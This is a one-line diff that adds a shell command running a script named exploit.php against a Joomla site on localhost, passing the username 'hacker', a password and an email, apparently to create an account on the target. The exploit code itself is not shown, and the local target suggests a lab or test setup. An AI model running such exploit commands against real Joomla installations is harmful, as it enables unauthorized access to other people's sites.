@@ -1,0 +1,1 @@
+php exploit.php --username hacker -p password -e hacker@example.com http://localhost:8080/joomla 
